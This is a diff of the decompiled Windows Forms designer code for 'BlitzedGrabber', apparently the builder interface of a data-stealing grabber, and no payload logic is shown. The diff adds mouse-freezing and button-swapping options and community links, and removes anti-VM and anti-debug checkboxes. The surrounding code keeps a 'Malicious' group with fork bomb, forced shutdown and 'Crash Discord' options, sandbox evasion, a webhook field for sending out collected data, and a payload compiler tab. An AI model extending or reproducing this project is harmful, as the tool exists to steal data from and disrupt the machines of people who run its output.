@@ -3,7 +3,7 @@
 	// Token: 0x0200001E RID: 30
 	public partial class Form1 : global::MetroFramework.Forms.MetroForm
 	{
-		// Token: 0x06000087 RID: 135 RVA: 0x00006524 File Offset: 0x00004924
+		// Token: 0x0600008B RID: 139 RVA: 0x0000651E File Offset: 0x0000471E
 		protected override void Dispose(bool disposing)
 		{
 			if (disposing && this.components != null)
@@ -13,11 +13,11 @@
 			base.Dispose(disposing);
 		}
 
-		// Token: 0x06000088 RID: 136 RVA: 0x00006544 File Offset: 0x00004944
+		// Token: 0x0600008C RID: 140 RVA: 0x00006540 File Offset: 0x00004740
 		[global::System.Obsolete]
 		private void InitializeComponent()
 		{
-			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::BlitzedGrabber.Form1));
+			global::System.ComponentModel.ComponentResourceManager resources = new global::System.ComponentModel.ComponentResourceManager(typeof(global::BlitzedGrabber.Form1));
 			this.compilerTab = new global::MetroFramework.Controls.MetroTabPage();
 			this.groupBox6 = new global::System.Windows.Forms.GroupBox();
 			this.metroButton4 = new global::MetroFramework.Controls.MetroButton();
@@ -26,18 +26,13 @@
 			this.compilerOutputTextBox = new global::MetroFramework.Controls.MetroTextBox();
 			this.extraTab = new global::MetroFramework.Controls.MetroTabPage();
 			this.groupBox4 = new global::System.Windows.Forms.GroupBox();
+			this.FreezeMouseSeconds = new global::MetroFramework.Controls.MetroTextBox();
+			this.FreezeMouseCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.metroPanel2 = new global::MetroFramework.Controls.MetroPanel();
-			this.metroPanel1 = new global::MetroFramework.Controls.MetroPanel();
-			this.comingSoonPanel2 = new global::MetroFramework.Controls.MetroPanel();
 			this.groupBox8 = new global::System.Windows.Forms.GroupBox();
 			this.AntiSandboxiecheckbox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.HideInIdentityCheckbox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.RespawnCheckbox = new global::MetroFramework.Controls.MetroCheckBox();
-			this.groupBox9 = new global::System.Windows.Forms.GroupBox();
-			this.AntiVMCheckbox = new global::MetroFramework.Controls.MetroCheckBox();
-			this.AntiDebugCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
-			this.AntiProcessHackerCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
-			this.AntiHTTPDebugCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.GigaByteCheckbox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.chooseIconButton = new global::MetroFramework.Controls.MetroButton();
 			this.errorTitleTextBox = new global::MetroFramework.Controls.MetroTextBox();
@@ -55,10 +50,11 @@
 			this.testWebhookButton = new global::MetroFramework.Controls.MetroButton();
 			this.webhookTextBox = new global::MetroFramework.Controls.MetroTextBox();
 			this.groupBox3 = new global::System.Windows.Forms.GroupBox();
-			this.DebugModeOn = new global::MetroFramework.Controls.MetroCheckBox();
+			this.DebugModeCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.metroCheckBox7 = new global::MetroFramework.Controls.MetroCheckBox();
 			this.CrashDiscordCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.groupBox2 = new global::System.Windows.Forms.GroupBox();
+			this.SwapMouseCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.ForkBombCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.restartpccheckbox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.shutdownpccheckbox = new global::MetroFramework.Controls.MetroCheckBox();
@@ -74,18 +70,20 @@
 			this.pcinfocheckbox = new global::MetroFramework.Controls.MetroCheckBox();
 			this.metroTabControl2 = new global::MetroFramework.Controls.MetroTabControl();
 			this.settingsPage = new global::MetroFramework.Controls.MetroTabPage();
-			this.TopMostCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
-			this.feedbackPage = new global::MetroFramework.Controls.MetroTabPage();
 			this.groupBox5 = new global::System.Windows.Forms.GroupBox();
-			this.appsuggestionstextbox = new global::MetroFramework.Controls.MetroTextBox();
+			this.RecoverMouseButtons = new global::MetroFramework.Controls.MetroButton();
+			this.TopMostCheckBox = new global::MetroFramework.Controls.MetroCheckBox();
+			this.ChangeLogLabel = new global::MetroFramework.Controls.MetroLabel();
+			this.textBox1 = new global::System.Windows.Forms.TextBox();
+			this.JoinDiscordButton = new global::MetroFramework.Controls.MetroButton();
+			this.OpenGithubButton = new global::MetroFramework.Controls.MetroButton();
+			this.JoinTelegramButton = new global::MetroFramework.Controls.MetroButton();
 			this.metroButton1 = new global::MetroFramework.Controls.MetroButton();
-			this.discorduserappsuggestionstextbox = new global::MetroFramework.Controls.MetroTextBox();
 			this.compilerTab.SuspendLayout();
 			this.groupBox6.SuspendLayout();
 			this.extraTab.SuspendLayout();
 			this.groupBox4.SuspendLayout();
 			this.groupBox8.SuspendLayout();
-			this.groupBox9.SuspendLayout();
 			((global::System.ComponentModel.ISupportInitialize)this.iconPictureBox).BeginInit();
 			this.optionsTab.SuspendLayout();
 			this.webhookGroupBox.SuspendLayout();
@@ -94,7 +92,6 @@
 			this.groupBox1.SuspendLayout();
 			this.metroTabControl2.SuspendLayout();
 			this.settingsPage.SuspendLayout();
-			this.feedbackPage.SuspendLayout();
 			this.groupBox5.SuspendLayout();
 			base.SuspendLayout();
 			this.compilerTab.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
@@ -221,11 +218,10 @@
 			this.extraTab.VerticalScrollbarHighlightOnWheel = false;
 			this.extraTab.VerticalScrollbarSize = 10;
 			this.groupBox4.BackColor = global::System.Drawing.Color.FromArgb(16, 16, 17);
+			this.groupBox4.Controls.Add(this.FreezeMouseSeconds);
+			this.groupBox4.Controls.Add(this.FreezeMouseCheckBox);
 			this.groupBox4.Controls.Add(this.metroPanel2);
-			this.groupBox4.Controls.Add(this.metroPanel1);
-			this.groupBox4.Controls.Add(this.comingSoonPanel2);
 			this.groupBox4.Controls.Add(this.groupBox8);
-			this.groupBox4.Controls.Add(this.groupBox9);
 			this.groupBox4.Controls.Add(this.GigaByteCheckbox);
 			this.groupBox4.Controls.Add(this.chooseIconButton);
 			this.groupBox4.Controls.Add(this.errorTitleTextBox);
@@ -245,6 +241,45 @@
 			this.groupBox4.TabIndex = 2;
 			this.groupBox4.TabStop = false;
 			this.groupBox4.Text = "Extras+";
+			this.groupBox4.Enter += new global::System.EventHandler(this.groupBox4_Enter);
+			this.FreezeMouseSeconds.CustomButton.Image = null;
+			this.FreezeMouseSeconds.CustomButton.Location = new global::System.Drawing.Point(90, 2);
+			this.FreezeMouseSeconds.CustomButton.Name = "";
+			this.FreezeMouseSeconds.CustomButton.Size = new global::System.Drawing.Size(17, 17);
+			this.FreezeMouseSeconds.CustomButton.Style = global::MetroFramework.MetroColorStyle.Blue;
+			this.FreezeMouseSeconds.CustomButton.TabIndex = 1;
+			this.FreezeMouseSeconds.CustomButton.Theme = global::MetroFramework.MetroThemeStyle.Light;
+			this.FreezeMouseSeconds.CustomButton.UseSelectable = true;
+			this.FreezeMouseSeconds.CustomButton.Visible = false;
+			this.FreezeMouseSeconds.Enabled = false;
+			this.FreezeMouseSeconds.ForeColor = global::System.Drawing.Color.White;
+			this.FreezeMouseSeconds.Lines = new string[0];
+			this.FreezeMouseSeconds.Location = new global::System.Drawing.Point(214, 184);
+			this.FreezeMouseSeconds.MaxLength = 32767;
+			this.FreezeMouseSeconds.Name = "FreezeMouseSeconds";
+			this.FreezeMouseSeconds.PasswordChar = '\0';
+			this.FreezeMouseSeconds.PromptText = "Seconds";
+			this.FreezeMouseSeconds.ScrollBars = global::System.Windows.Forms.ScrollBars.None;
+			this.FreezeMouseSeconds.SelectedText = "";
+			this.FreezeMouseSeconds.SelectionLength = 0;
+			this.FreezeMouseSeconds.SelectionStart = 0;
+			this.FreezeMouseSeconds.ShortcutsEnabled = true;
+			this.FreezeMouseSeconds.Size = new global::System.Drawing.Size(110, 22);
+			this.FreezeMouseSeconds.TabIndex = 72;
+			this.FreezeMouseSeconds.Theme = global::MetroFramework.MetroThemeStyle.Dark;
+			this.FreezeMouseSeconds.UseSelectable = true;
+			this.FreezeMouseSeconds.WaterMark = "Seconds";
+			this.FreezeMouseSeconds.WaterMarkColor = global::System.Drawing.Color.FromArgb(109, 109, 109);
+			this.FreezeMouseSeconds.WaterMarkFont = new global::System.Drawing.Font("Segoe UI", 12f, global::System.Drawing.FontStyle.Italic, global::System.Drawing.GraphicsUnit.Pixel);
+			this.FreezeMouseCheckBox.AutoSize = true;
+			this.FreezeMouseCheckBox.Location = new global::System.Drawing.Point(214, 161);
+			this.FreezeMouseCheckBox.Name = "FreezeMouseCheckBox";
+			this.FreezeMouseCheckBox.Size = new global::System.Drawing.Size(95, 15);
+			this.FreezeMouseCheckBox.TabIndex = 73;
+			this.FreezeMouseCheckBox.Text = "Freeze Mouse";
+			this.FreezeMouseCheckBox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
+			this.FreezeMouseCheckBox.UseSelectable = true;
+			this.FreezeMouseCheckBox.CheckedChanged += new global::System.EventHandler(this.FreezeMouseCheckBox_CheckedChanged);
 			this.metroPanel2.BackColor = global::System.Drawing.Color.Transparent;
 			this.metroPanel2.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
 			this.metroPanel2.ForeColor = global::System.Drawing.Color.White;
@@ -259,39 +294,11 @@
 			this.metroPanel2.VerticalScrollbarBarColor = true;
 			this.metroPanel2.VerticalScrollbarHighlightOnWheel = false;
 			this.metroPanel2.VerticalScrollbarSize = 10;
-			this.metroPanel1.BackColor = global::System.Drawing.Color.Transparent;
-			this.metroPanel1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
-			this.metroPanel1.ForeColor = global::System.Drawing.Color.White;
-			this.metroPanel1.HorizontalScrollbarBarColor = true;
-			this.metroPanel1.HorizontalScrollbarHighlightOnWheel = false;
-			this.metroPanel1.HorizontalScrollbarSize = 10;
-			this.metroPanel1.Location = new global::System.Drawing.Point(614, 160);
-			this.metroPanel1.Name = "metroPanel1";
-			this.metroPanel1.Size = new global::System.Drawing.Size(167, 116);
-			this.metroPanel1.TabIndex = 70;
-			this.metroPanel1.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.metroPanel1.VerticalScrollbarBarColor = true;
-			this.metroPanel1.VerticalScrollbarHighlightOnWheel = false;
-			this.metroPanel1.VerticalScrollbarSize = 10;
-			this.comingSoonPanel2.BackColor = global::System.Drawing.Color.Transparent;
-			this.comingSoonPanel2.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
-			this.comingSoonPanel2.ForeColor = global::System.Drawing.Color.White;
-			this.comingSoonPanel2.HorizontalScrollbarBarColor = true;
-			this.comingSoonPanel2.HorizontalScrollbarHighlightOnWheel = false;
-			this.comingSoonPanel2.HorizontalScrollbarSize = 10;
-			this.comingSoonPanel2.Location = new global::System.Drawing.Point(434, 160);
-			this.comingSoonPanel2.Name = "comingSoonPanel2";
-			this.comingSoonPanel2.Size = new global::System.Drawing.Size(167, 116);
-			this.comingSoonPanel2.TabIndex = 69;
-			this.comingSoonPanel2.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.comingSoonPanel2.VerticalScrollbarBarColor = true;
-			this.comingSoonPanel2.VerticalScrollbarHighlightOnWheel = false;
-			this.comingSoonPanel2.VerticalScrollbarSize = 10;
 			this.groupBox8.Controls.Add(this.AntiSandboxiecheckbox);
 			this.groupBox8.Controls.Add(this.HideInIdentityCheckbox);
 			this.groupBox8.Controls.Add(this.RespawnCheckbox);
 			this.groupBox8.ForeColor = global::System.Drawing.SystemColors.ControlLightLight;
-			this.groupBox8.Location = new global::System.Drawing.Point(226, 154);
+			this.groupBox8.Location = new global::System.Drawing.Point(14, 158);
 			this.groupBox8.Name = "groupBox8";
 			this.groupBox8.Size = new global::System.Drawing.Size(192, 122);
 			this.groupBox8.TabIndex = 68;
@@ -321,49 +328,6 @@
 			this.RespawnCheckbox.Text = "Respawn";
 			this.RespawnCheckbox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
 			this.RespawnCheckbox.UseSelectable = true;
-			this.groupBox9.Controls.Add(this.AntiVMCheckbox);
-			this.groupBox9.Controls.Add(this.AntiDebugCheckBox);
-			this.groupBox9.Controls.Add(this.AntiProcessHackerCheckBox);
-			this.groupBox9.Controls.Add(this.AntiHTTPDebugCheckBox);
-			this.groupBox9.ForeColor = global::System.Drawing.SystemColors.ControlLightLight;
-			this.groupBox9.Location = new global::System.Drawing.Point(14, 154);
-			this.groupBox9.Name = "groupBox9";
-			this.groupBox9.Size = new global::System.Drawing.Size(192, 122);
-			this.groupBox9.TabIndex = 67;
-			this.groupBox9.TabStop = false;
-			this.groupBox9.Text = "Protections";
-			this.AntiVMCheckbox.AutoSize = true;
-			this.AntiVMCheckbox.Location = new global::System.Drawing.Point(10, 92);
-			this.AntiVMCheckbox.Name = "AntiVMCheckbox";
-			this.AntiVMCheckbox.Size = new global::System.Drawing.Size(66, 15);
-			this.AntiVMCheckbox.TabIndex = 59;
-			this.AntiVMCheckbox.Text = "Anti VM";
-			this.AntiVMCheckbox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.AntiVMCheckbox.UseSelectable = true;
-			this.AntiDebugCheckBox.AutoSize = true;
-			this.AntiDebugCheckBox.Location = new global::System.Drawing.Point(10, 68);
-			this.AntiDebugCheckBox.Name = "AntiDebugCheckBox";
-			this.AntiDebugCheckBox.Size = new global::System.Drawing.Size(83, 15);
-			this.AntiDebugCheckBox.TabIndex = 58;
-			this.AntiDebugCheckBox.Text = "Anti Debug";
-			this.AntiDebugCheckBox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.AntiDebugCheckBox.UseSelectable = true;
-			this.AntiProcessHackerCheckBox.AutoSize = true;
-			this.AntiProcessHackerCheckBox.Location = new global::System.Drawing.Point(10, 46);
-			this.AntiProcessHackerCheckBox.Name = "AntiProcessHackerCheckBox";
-			this.AntiProcessHackerCheckBox.Size = new global::System.Drawing.Size(128, 15);
-			this.AntiProcessHackerCheckBox.TabIndex = 57;
-			this.AntiProcessHackerCheckBox.Text = "Anti Process Hacker";
-			this.AntiProcessHackerCheckBox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.AntiProcessHackerCheckBox.UseSelectable = true;
-			this.AntiHTTPDebugCheckBox.AutoSize = true;
-			this.AntiHTTPDebugCheckBox.Location = new global::System.Drawing.Point(10, 22);
-			this.AntiHTTPDebugCheckBox.Name = "AntiHTTPDebugCheckBox";
-			this.AntiHTTPDebugCheckBox.Size = new global::System.Drawing.Size(131, 15);
-			this.AntiHTTPDebugCheckBox.TabIndex = 56;
-			this.AntiHTTPDebugCheckBox.Text = "Anti HTTP Debugger";
-			this.AntiHTTPDebugCheckBox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.AntiHTTPDebugCheckBox.UseSelectable = true;
 			this.GigaByteCheckbox.AutoSize = true;
 			this.GigaByteCheckbox.Enabled = false;
 			this.GigaByteCheckbox.FontSize = global::MetroFramework.MetroCheckBoxSize.Medium;
@@ -632,7 +596,7 @@
 			this.webhookTextBox.WaterMarkColor = global::System.Drawing.Color.FromArgb(109, 109, 109);
 			this.webhookTextBox.WaterMarkFont = new global::System.Drawing.Font("Segoe UI", 12f, global::System.Drawing.FontStyle.Italic, global::System.Drawing.GraphicsUnit.Pixel);
 			this.groupBox3.BackColor = global::System.Drawing.Color.Transparent;
-			this.groupBox3.Controls.Add(this.DebugModeOn);
+			this.groupBox3.Controls.Add(this.DebugModeCheckBox);
 			this.groupBox3.Controls.Add(this.metroCheckBox7);
 			this.groupBox3.Controls.Add(this.CrashDiscordCheckBox);
 			this.groupBox3.ForeColor = global::System.Drawing.SystemColors.ControlLightLight;
@@ -642,14 +606,14 @@
 			this.groupBox3.TabIndex = 54;
 			this.groupBox3.TabStop = false;
 			this.groupBox3.Text = "Misc";
-			this.DebugModeOn.AutoSize = true;
-			this.DebugModeOn.Location = new global::System.Drawing.Point(12, 20);
-			this.DebugModeOn.Name = "DebugModeOn";
-			this.DebugModeOn.Size = new global::System.Drawing.Size(92, 15);
-			this.DebugModeOn.TabIndex = 39;
-			this.DebugModeOn.Text = "Debug Mode";
-			this.DebugModeOn.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.DebugModeOn.UseSelectable = true;
+			this.DebugModeCheckBox.AutoSize = true;
+			this.DebugModeCheckBox.Location = new global::System.Drawing.Point(12, 20);
+			this.DebugModeCheckBox.Name = "DebugModeCheckBox";
+			this.DebugModeCheckBox.Size = new global::System.Drawing.Size(92, 15);
+			this.DebugModeCheckBox.TabIndex = 39;
+			this.DebugModeCheckBox.Text = "Debug Mode";
+			this.DebugModeCheckBox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
+			this.DebugModeCheckBox.UseSelectable = true;
 			this.metroCheckBox7.AutoSize = true;
 			this.metroCheckBox7.Location = new global::System.Drawing.Point(12, 48);
 			this.metroCheckBox7.Name = "metroCheckBox7";
@@ -667,6 +631,7 @@
 			this.CrashDiscordCheckBox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
 			this.CrashDiscordCheckBox.UseSelectable = true;
 			this.groupBox2.BackColor = global::System.Drawing.Color.Transparent;
+			this.groupBox2.Controls.Add(this.SwapMouseCheckBox);
 			this.groupBox2.Controls.Add(this.ForkBombCheckBox);
 			this.groupBox2.Controls.Add(this.restartpccheckbox);
 			this.groupBox2.Controls.Add(this.shutdownpccheckbox);
@@ -678,6 +643,14 @@
 			this.groupBox2.TabIndex = 53;
 			this.groupBox2.TabStop = false;
 			this.groupBox2.Text = "Malicious";
+			this.SwapMouseCheckBox.AutoSize = true;
+			this.SwapMouseCheckBox.Location = new global::System.Drawing.Point(12, 132);
+			this.SwapMouseCheckBox.Name = "SwapMouseCheckBox";
+			this.SwapMouseCheckBox.Size = new global::System.Drawing.Size(134, 15);
+			this.SwapMouseCheckBox.TabIndex = 50;
+			this.SwapMouseCheckBox.Text = "Swap Mouse Buttons";
+			this.SwapMouseCheckBox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
+			this.SwapMouseCheckBox.UseSelectable = true;
 			this.ForkBombCheckBox.AutoSize = true;
 			this.ForkBombCheckBox.Location = new global::System.Drawing.Point(12, 20);
 			this.ForkBombCheckBox.Name = "ForkBombCheckBox";
@@ -799,10 +772,9 @@
 			this.metroTabControl2.Controls.Add(this.extraTab);
 			this.metroTabControl2.Controls.Add(this.compilerTab);
 			this.metroTabControl2.Controls.Add(this.settingsPage);
-			this.metroTabControl2.Controls.Add(this.feedbackPage);
 			this.metroTabControl2.Location = new global::System.Drawing.Point(0, 58);
 			this.metroTabControl2.Name = "metroTabControl2";
-			this.metroTabControl2.SelectedIndex = 1;
+			this.metroTabControl2.SelectedIndex = 3;
 			this.metroTabControl2.Size = new global::System.Drawing.Size(840, 384);
 			this.metroTabControl2.SizeMode = global::System.Windows.Forms.TabSizeMode.Fixed;
 			this.metroTabControl2.Style = global::MetroFramework.MetroColorStyle.Red;
@@ -810,6 +782,13 @@
 			this.metroTabControl2.Theme = global::MetroFramework.MetroThemeStyle.Dark;
 			this.metroTabControl2.UseSelectable = true;
 			this.metroTabControl2.SelectedIndexChanged += new global::System.EventHandler(this.metroTabControl2_SelectedIndexChanged);
+			this.settingsPage.Controls.Add(this.metroButton1);
+			this.settingsPage.Controls.Add(this.JoinTelegramButton);
+			this.settingsPage.Controls.Add(this.OpenGithubButton);
+			this.settingsPage.Controls.Add(this.JoinDiscordButton);
+			this.settingsPage.Controls.Add(this.textBox1);
+			this.settingsPage.Controls.Add(this.ChangeLogLabel);
+			this.settingsPage.Controls.Add(this.groupBox5);
 			this.settingsPage.Controls.Add(this.TopMostCheckBox);
 			this.settingsPage.HorizontalScrollbarBarColor = true;
 			this.settingsPage.HorizontalScrollbarHighlightOnWheel = false;
@@ -824,8 +803,26 @@
 			this.settingsPage.VerticalScrollbarBarColor = true;
 			this.settingsPage.VerticalScrollbarHighlightOnWheel = false;
 			this.settingsPage.VerticalScrollbarSize = 10;
+			this.groupBox5.BackColor = global::System.Drawing.Color.Transparent;
+			this.groupBox5.Controls.Add(this.RecoverMouseButtons);
+			this.groupBox5.ForeColor = global::System.Drawing.SystemColors.ControlLightLight;
+			this.groupBox5.Location = new global::System.Drawing.Point(284, 146);
+			this.groupBox5.Name = "groupBox5";
+			this.groupBox5.Size = new global::System.Drawing.Size(260, 178);
+			this.groupBox5.TabIndex = 41;
+			this.groupBox5.TabStop = false;
+			this.groupBox5.Text = "Recovery";
+			this.RecoverMouseButtons.Location = new global::System.Drawing.Point(10, 22);
+			this.RecoverMouseButtons.Name = "RecoverMouseButtons";
+			this.RecoverMouseButtons.Size = new global::System.Drawing.Size(114, 38);
+			this.RecoverMouseButtons.Style = global::MetroFramework.MetroColorStyle.Red;
+			this.RecoverMouseButtons.TabIndex = 0;
+			this.RecoverMouseButtons.Text = "Fix Mouse";
+			this.RecoverMouseButtons.Theme = global::MetroFramework.MetroThemeStyle.Dark;
+			this.RecoverMouseButtons.UseSelectable = true;
+			this.RecoverMouseButtons.Click += new global::System.EventHandler(this.RecoverMouseButtons_Click);
 			this.TopMostCheckBox.AutoSize = true;
-			this.TopMostCheckBox.Location = new global::System.Drawing.Point(32, 38);
+			this.TopMostCheckBox.Location = new global::System.Drawing.Point(10, 16);
 			this.TopMostCheckBox.Name = "TopMostCheckBox";
 			this.TopMostCheckBox.Size = new global::System.Drawing.Size(72, 15);
 			this.TopMostCheckBox.TabIndex = 40;
@@ -833,104 +830,68 @@
 			this.TopMostCheckBox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
 			this.TopMostCheckBox.UseSelectable = true;
 			this.TopMostCheckBox.CheckedChanged += new global::System.EventHandler(this.metroCheckBox6_CheckedChanged);
-			this.feedbackPage.Controls.Add(this.groupBox5);
-			this.feedbackPage.HorizontalScrollbarBarColor = true;
-			this.feedbackPage.HorizontalScrollbarHighlightOnWheel = false;
-			this.feedbackPage.HorizontalScrollbarSize = 10;
-			this.feedbackPage.Location = new global::System.Drawing.Point(4, 38);
-			this.feedbackPage.Name = "feedbackPage";
-			this.feedbackPage.Size = new global::System.Drawing.Size(832, 342);
-			this.feedbackPage.Style = global::MetroFramework.MetroColorStyle.Red;
-			this.feedbackPage.TabIndex = 6;
-			this.feedbackPage.Text = "FeedBack";
-			this.feedbackPage.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.feedbackPage.VerticalScrollbarBarColor = true;
-			this.feedbackPage.VerticalScrollbarHighlightOnWheel = false;
-			this.feedbackPage.VerticalScrollbarSize = 10;
-			this.groupBox5.BackColor = global::System.Drawing.Color.Transparent;
-			this.groupBox5.Controls.Add(this.appsuggestionstextbox);
-			this.groupBox5.Controls.Add(this.metroButton1);
-			this.groupBox5.Controls.Add(this.discorduserappsuggestionstextbox);
-			this.groupBox5.Font = new global::System.Drawing.Font("Segoe UI", 7.8f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
-			this.groupBox5.ForeColor = global::System.Drawing.Color.White;
-			this.groupBox5.Location = new global::System.Drawing.Point(22, 48);
-			this.groupBox5.Name = "groupBox5";
-			this.groupBox5.Size = new global::System.Drawing.Size(782, 112);
-			this.groupBox5.TabIndex = 42;
-			this.groupBox5.TabStop = false;
-			this.groupBox5.Text = "App Suggestions";
-			this.appsuggestionstextbox.CustomButton.Image = null;
-			this.appsuggestionstextbox.CustomButton.Location = new global::System.Drawing.Point(629, 2);
-			this.appsuggestionstextbox.CustomButton.Name = "";
-			this.appsuggestionstextbox.CustomButton.Size = new global::System.Drawing.Size(17, 17);
-			this.appsuggestionstextbox.CustomButton.Style = global::MetroFramework.MetroColorStyle.Blue;
-			this.appsuggestionstextbox.CustomButton.TabIndex = 1;
-			this.appsuggestionstextbox.CustomButton.Theme = global::MetroFramework.MetroThemeStyle.Light;
-			this.appsuggestionstextbox.CustomButton.UseSelectable = true;
-			this.appsuggestionstextbox.CustomButton.Visible = false;
-			this.appsuggestionstextbox.ForeColor = global::System.Drawing.Color.White;
-			this.appsuggestionstextbox.Lines = new string[0];
-			this.appsuggestionstextbox.Location = new global::System.Drawing.Point(20, 60);
-			this.appsuggestionstextbox.MaxLength = 32767;
-			this.appsuggestionstextbox.Name = "appsuggestionstextbox";
-			this.appsuggestionstextbox.PasswordChar = '\0';
-			this.appsuggestionstextbox.PromptText = "Suggestion(s), Features To Add, ETC";
-			this.appsuggestionstextbox.ScrollBars = global::System.Windows.Forms.ScrollBars.None;
-			this.appsuggestionstextbox.SelectedText = "";
-			this.appsuggestionstextbox.SelectionLength = 0;
-			this.appsuggestionstextbox.SelectionStart = 0;
-			this.appsuggestionstextbox.ShortcutsEnabled = true;
-			this.appsuggestionstextbox.Size = new global::System.Drawing.Size(649, 22);
-			this.appsuggestionstextbox.TabIndex = 42;
-			this.appsuggestionstextbox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.appsuggestionstextbox.UseSelectable = true;
-			this.appsuggestionstextbox.WaterMark = "Suggestion(s), Features To Add, ETC";
-			this.appsuggestionstextbox.WaterMarkColor = global::System.Drawing.Color.FromArgb(109, 109, 109);
-			this.appsuggestionstextbox.WaterMarkFont = new global::System.Drawing.Font("Segoe UI", 12f, global::System.Drawing.FontStyle.Italic, global::System.Drawing.GraphicsUnit.Pixel);
-			this.appsuggestionstextbox.Click += new global::System.EventHandler(this.metroTextBox2_Click);
-			this.metroButton1.Highlight = true;
-			this.metroButton1.Location = new global::System.Drawing.Point(676, 26);
+			this.ChangeLogLabel.AutoSize = true;
+			this.ChangeLogLabel.FontWeight = global::MetroFramework.MetroLabelWeight.Regular;
+			this.ChangeLogLabel.Location = new global::System.Drawing.Point(90, 118);
+			this.ChangeLogLabel.Name = "ChangeLogLabel";
+			this.ChangeLogLabel.Size = new global::System.Drawing.Size(79, 19);
+			this.ChangeLogLabel.Style = global::MetroFramework.MetroColorStyle.Red;
+			this.ChangeLogLabel.TabIndex = 44;
+			this.ChangeLogLabel.Text = "ChangeLog";
+			this.ChangeLogLabel.Theme = global::MetroFramework.MetroThemeStyle.Dark;
+			this.textBox1.BackColor = global::System.Drawing.Color.FromArgb(16, 17, 16);
+			this.textBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
+			this.textBox1.Cursor = global::System.Windows.Forms.Cursors.No;
+			this.textBox1.Font = new global::System.Drawing.Font("Segoe UI", 9f, global::System.Drawing.FontStyle.Italic, global::System.Drawing.GraphicsUnit.Point, 0);
+			this.textBox1.ForeColor = global::System.Drawing.SystemColors.WindowFrame;
+			this.textBox1.Location = new global::System.Drawing.Point(4, 148);
+			this.textBox1.Multiline = true;
+			this.textBox1.Name = "textBox1";
+			this.textBox1.ReadOnly = true;
+			this.textBox1.ScrollBars = global::System.Windows.Forms.ScrollBars.Vertical;
+			this.textBox1.Size = new global::System.Drawing.Size(266, 176);
+			this.textBox1.TabIndex = 46;
+			this.textBox1.Text = resources.GetString("textBox1.Text");
+			this.JoinDiscordButton.Location = new global::System.Drawing.Point(558, 152);
+			this.JoinDiscordButton.Name = "JoinDiscordButton";
+			this.JoinDiscordButton.Size = new global::System.Drawing.Size(114, 38);
+			this.JoinDiscordButton.Style = global::MetroFramework.MetroColorStyle.Red;
+			this.JoinDiscordButton.TabIndex = 47;
+			this.JoinDiscordButton.Text = "Join Discord";
+			this.JoinDiscordButton.Theme = global::MetroFramework.MetroThemeStyle.Dark;
+			this.JoinDiscordButton.UseSelectable = true;
+			this.JoinDiscordButton.Click += new global::System.EventHandler(this.JoinDiscordButton_Click);
+			this.OpenGithubButton.Location = new global::System.Drawing.Point(686, 152);
+			this.OpenGithubButton.Name = "OpenGithubButton";
+			this.OpenGithubButton.Size = new global::System.Drawing.Size(114, 38);
+			this.OpenGithubButton.Style = global::MetroFramework.MetroColorStyle.Red;
+			this.OpenGithubButton.TabIndex = 48;
+			this.OpenGithubButton.Text = "Our Github";
+			this.OpenGithubButton.Theme = global::MetroFramework.MetroThemeStyle.Dark;
+			this.OpenGithubButton.UseSelectable = true;
+			this.OpenGithubButton.Click += new global::System.EventHandler(this.metroButton1_Click);
+			this.JoinTelegramButton.Location = new global::System.Drawing.Point(558, 200);
+			this.JoinTelegramButton.Name = "JoinTelegramButton";
+			this.JoinTelegramButton.Size = new global::System.Drawing.Size(114, 38);
+			this.JoinTelegramButton.Style = global::MetroFramework.MetroColorStyle.Red;
+			this.JoinTelegramButton.TabIndex = 49;
+			this.JoinTelegramButton.Text = "Join Telegram";
+			this.JoinTelegramButton.Theme = global::MetroFramework.MetroThemeStyle.Dark;
+			this.JoinTelegramButton.UseSelectable = true;
+			this.JoinTelegramButton.Click += new global::System.EventHandler(this.JoinTelegramButton_Click);
+			this.metroButton1.Location = new global::System.Drawing.Point(686, 200);
 			this.metroButton1.Name = "metroButton1";
-			this.metroButton1.Size = new global::System.Drawing.Size(92, 60);
+			this.metroButton1.Size = new global::System.Drawing.Size(114, 38);
 			this.metroButton1.Style = global::MetroFramework.MetroColorStyle.Red;
-			this.metroButton1.TabIndex = 41;
-			this.metroButton1.Text = "Send Feedback";
+			this.metroButton1.TabIndex = 50;
+			this.metroButton1.Text = "Coming Soon";
 			this.metroButton1.Theme = global::MetroFramework.MetroThemeStyle.Dark;
 			this.metroButton1.UseSelectable = true;
-			this.metroButton1.Click += new global::System.EventHandler(this.metroButton1_Click);
-			this.discorduserappsuggestionstextbox.CustomButton.Image = null;
-			this.discorduserappsuggestionstextbox.CustomButton.Location = new global::System.Drawing.Point(629, 2);
-			this.discorduserappsuggestionstextbox.CustomButton.Name = "";
